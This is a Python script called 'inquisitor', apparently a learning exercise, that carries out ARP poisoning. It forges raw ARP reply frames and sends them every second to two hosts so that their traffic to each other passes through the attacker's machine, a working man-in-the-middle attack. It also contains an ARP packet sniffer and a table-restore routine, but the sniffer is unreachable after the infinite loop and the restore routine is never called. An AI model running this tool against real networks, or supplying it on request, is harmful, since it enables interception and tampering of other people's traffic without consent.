#! /usr/bin/python3

import argparse
import socket, struct
import time


ETH_TYPE = 0x0806

def parser():
    parser = argparse.ArgumentParser(
        prog='inquisitor',
        description='ARP poisoning'
    )
    parser.add_argument(
        'SRC_IP',
        type=str,
        help="IP from source host"
    )
    parser.add_argument(
        'SRC_MAC',
        type=str,
        help="MAC from source host"
    )
    parser.add_argument(
        'TARGET_IP',
        type=str,
        help="IP from target host"
    )
    parser.add_argument(
        'TARGET_MAC',
        type=str,
        help="MAC from target host"
    )
    return parser.parse_args()


def create_server_socket():
    try:
        server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_TYPE))
        # server_socket.settimeout(2)
        return server_socket
    except PermissionError:
        print("Error: Network capabilities disabled")
        print("Try: sudo setcap cap_net_raw+ep inquisitor.py or sudo python inquisitor.py")
        exit(1)
    except Exception as e:
        print(f"Error creating socket: {e}")
        exit(1)

# Convert byte MAC to str format: ff:ff:ff:ff:ff:ff
def format_mac(byte_mac):
    return ':'.join(f'{b:02x}' for b in byte_mac)


"""

                               PKT
|-------------------------------------------------------------------|
| ethhdr | arphdr | sender_mac | sender_ip | target_mac | target_ip |
|-------------------------------------------------------------------|
               ETH_HDR
|------------------------------------|
| h_dest   - destination eth addr    |
| h_source - source ether addr       |
| h_proto  - packet type ID field    |
|------------------------------------|
                ARP_HDR
|-------------------------------------|
| ar_hrd - format of mac address      |
| ar_pro - format of protocol address |
| ar_hln - format of mac address      |
| ar_pln - format of mac address      |
| ar_op  - format of mac address      |
|-------------------------------------|
| ar_sha[6]  - sender hardware address|
| ar_sip[4]  - sender IP address      |
| ar_tha[6]  - target hardware address|
| ar_tip[4]  - target IP address      |
|-------------------------------------|


"""


def parse_eth_header(packet):
    eth_hdr = packet[:14]
    eth_fields = struct.unpack("!6s6sH", eth_hdr)
    eth_dest = eth_fields[0]
    eth_src = eth_fields[1]
    eth_type = eth_fields[2]

    print(f"eth_dest: ", format_mac(eth_dest))
    print(f"eth_src:  ", format_mac(eth_src))
    print(f"eth_type: ", "ETH_TYPE" if eth_type == ETH_TYPE else eth_type)
    return eth_type


"""
    struct.unpack()

    !    = Network format
    H    = unsigned short
    B    = unsigned char
    [n]s = char[n]

    https://docs.python.org/3/library/struct.html
"""

def parse_arp_packet(packet, addr):
    arp_packet = packet[14:42]
    arp_fields = struct.unpack('!HHBBH6s4s6s4s', arp_packet)

    # arp_hdr
    hw_type = arp_fields[0]
    proto_type = arp_fields[1]
    hw_size = arp_fields[2]
    proto_size = arp_fields[3]
    opcode = arp_fields[4]

    # sender/target info
    sender_mac = arp_fields[5]
    sender_ip = arp_fields[6]
    target_mac = arp_fields[7]
    target_ip = arp_fields[8]

    sender_mac_str = format_mac(sender_mac)
    target_mac_str = format_mac(target_mac)
    sender_ip_str = socket.inet_ntoa(sender_ip)
    target_ip_str = socket.inet_ntoa(target_ip)

    OPCODES = { 1: 'REQUEST', 2: 'REPLY' }
    print(f"\nARP Packet received:")
    print(f"  Operation: {OPCODES.get(opcode, 'UNKNOWN')}")
    print(f"  Sender MAC: {sender_mac_str}")
    print(f"  Sender IP: {sender_ip_str}")
    print(f"  Target MAC: {target_mac_str}")
    print(f"  Target IP: {target_ip_str}")
    print(f"  Interface: {addr[0] if addr else 'unknown'}")


def recv_packet(socket):
    while True:
        try:
            packet, addr = socket.recvfrom(1024)
            # print("PACKET: ", packet)
            # print("ADR:    ", addr)

            if (parse_eth_header(packet) != ETH_TYPE):
                continue
            parse_arp_packet(packet, addr)
        except Exception as e:
            print("Error: ", e)


from getmac import get_mac_address as gma
import binascii

# https://docs.huihoo.com/doxygen/linux/kernel/3.7/uapi_2linux_2if__ether_8h.html

ETH_ALEN        = 6 # Octets in one ethernet addr

# These are the defined Ethernet Protocol ID's.
ETH_P_IP        = 0x0800 # Internet Protocol packets
ETH_P_ARP       = 0x0806 # Address Resolution packet
# ARP protocol HARDWARE identifiers
ARPHRD_ETHER    = 1 # Ethernet 10Mbps

# ARP protocol opcodes.
ARPOP_REQUEST   = 1
ARPOP_REPLY     = 2
ARPOP_RREQUEST  = 3
ARPOP_RREPLY    = 4
ARPOP_INREQUEST = 8
ARPOP_INREPLY   = 9
ARPOP_NAK       = 10

args = parser()

def parse_ip(ip_str):
    try:
        ip_network = socket.inet_aton(ip_str)
        return ip_str, ip_network
    except Exception as e:
        print(f"Invalid IP: {ip_str}")
        exit(1)


IP_SRC_STR, IP_SRC_BYTE = parse_ip(args.SRC_IP)
IP_TARGET_STR, IP_TARGET_BYTE = parse_ip(args.TARGET_IP)
MAC_SRC = args.SRC_MAC
MAC_TARGET = args.TARGET_MAC
MAC_ATTACKER = gma()

print(IP_SRC_STR, IP_SRC_BYTE)
print(IP_TARGET_STR, IP_TARGET_BYTE)


def create_eth_header(mac_target, mac_infected):
    h_dest = binascii.unhexlify(mac_target.replace(':', ''))
    h_source = binascii.unhexlify(mac_infected.replace(':', ''))
    h_proto = ETH_P_ARP
    eth_header = struct.pack(
        '!6s6sH',
        h_dest, h_source, h_proto
    )
    # print("ETH_HDR: ", eth_header)
    return eth_header

def create_arp_packet(ip_src, ip_target, mac_target, mac_infected):
    # ARP HEADER
    ar_hrd = ARPHRD_ETHER
    ar_pro = ETH_P_IP
    ar_hln = ETH_ALEN
    ar_pln = 4
    ar_op  = ARPOP_REPLY

    # ARP DATA
    ar_sha = binascii.unhexlify(mac_infected.replace(':', ''))
    ar_sip = socket.inet_aton(ip_src)
    ar_tha = binascii.unhexlify(mac_target.replace(':', ''))
    ar_tip = socket.inet_aton(ip_target)

    arp_packet = struct.pack(
        '!HHBBH6s4s6s4s',
        ar_hrd, ar_pro, ar_hln, ar_pln, ar_op,
        ar_sha, ar_sip,
        ar_tha, ar_tip
    )
    # print("ARP_PACKET: ", arp_packet)
    return arp_packet

def create_sendto_socket():
    try:
        return socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP)
        )
    except Exception as e:
        print(f"Error: {e}")


def send_packet(ip_src, ip_target, mac_target, mac_infected):
    eth_header = create_eth_header(mac_target, mac_infected)
    arp_packet = create_arp_packet(ip_src, ip_target, mac_target, mac_infected)
    full_arp_packet = eth_header + arp_packet
    # print("FULL_ARP: ", full_arp_packet)
    sendto_sock = create_sendto_socket()
    sent = sendto_sock.sendto(
        full_arp_packet,
        ("eth0", 0, 0, 0, b'')
    )
    print(".", end='', flush=True)
    sendto_sock.close()

def poison_target(ip_src, ip_target, mac_target, infected_mac):
    send_packet(ip_src, ip_target, mac_target, infected_mac)


def restore_arp_tables():
    print(f"Restoring tables...")
    time.sleep(2)
    poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_TARGET)
    poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_SRC)
    print(f"")


if __name__ == "__main__":
    try:
        # server_socket = create_server_socket()
        while True:
            poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_ATTACKER)
            poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_ATTACKER)
            # print('-'*50)
            time.sleep(1)
        recv_packet(server_socket)
    except KeyboardInterrupt:
        print("keyboard interrupt")
    # finally:
        # server_socket.close()
